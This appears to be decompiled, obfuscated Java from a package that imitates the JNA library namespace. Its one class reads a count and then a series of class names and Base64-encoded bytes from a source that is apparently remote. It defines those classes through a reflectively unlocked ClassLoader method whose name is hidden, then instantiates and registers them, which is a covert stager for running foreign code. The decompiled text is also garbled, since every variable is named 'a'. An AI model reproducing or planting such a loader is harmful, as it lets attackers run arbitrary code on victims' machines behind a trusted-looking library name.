package com.sun.jna.z.a.b;

import com.sun.jna.z.Main;
import com.sun.jna.z.a.e.c;
import com.sun.jna.z.a.e.g;
import com.sun.jna.z.a.i;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Base64.Decoder;

public class d
{
  e a;
  private static final String b;
  
  public void a()
  {
    a.a.a(15);int a = e.e;int a = Integer.parseInt(a.a.b());int a = 0;
    do
    {
      if (a >= a) {
        break;
      }
      String a = a.a.c();byte[] a = a.b();a.a(a, a);a++;
    } while (a == 0);
  }
  
  void a(byte[] a, String a)
  {
    try
    {
      Method a = ClassLoader.class.getDeclaredMethod(b, new Class[] { String.class, byte[].class, Integer.TYPE, Integer.TYPE });
      a.setAccessible(true);
      
      Class a = (Class)a.invoke(Main.c.a, new Object[] { a, a, Integer.valueOf(0), Integer.valueOf(a.length) });
      if (a.contains("$")) {
        return;
      }
      Constructor a = a.getDeclaredConstructors()[0];
      
      c a = (c)a.newInstance(new Object[0]);i.d.a.a(a);
    }
    catch (Exception a) {}
    a.printStackTrace();
  }
  
  public d(e a)
  {
    a.a = a;
  }
  
  byte[] b()
  {
    return Base64.getDecoder().decode(a.b(a.a.b()));
  }
}
